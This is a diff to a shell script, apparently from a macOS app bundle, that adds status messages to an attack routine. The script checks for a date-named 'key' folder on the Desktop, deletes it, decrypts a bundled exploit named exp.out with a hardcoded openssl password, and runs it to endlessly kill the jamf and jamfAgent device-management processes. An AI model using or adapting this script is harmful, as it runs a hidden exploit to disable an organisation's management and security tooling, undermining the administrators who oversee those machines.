@@ -4,11 +4,19 @@ res="$(dirname "$(dirname "$0")")/Resources"
 key="~/Desktop/$(date +%y%d)"
 
 # Run only if directory on Desktop exists with the current year and day
-if ! [[ -d $key ]]; then exit 1; fi
+echo "Checking for key at $key..."
+if ! [[ -d $key ]]; then
+    echo "Could not find key." >&2
+    exit 1
+fi
+echo "Key found."
 
+echo "Deleting key."
 rm -rf $key
+echo "Decrypting exploit."
 openssl des3 -d -in "$res/exp.out.des3" -k b51861c95142fce29aef7b6416fa21d5 > /tmp/exp.out
 
+echo "Doing work."
 /tmp/exp.out <<'EOF'
 (for ((;;)); do killall jamf jamfAgent; done) &
 EOF
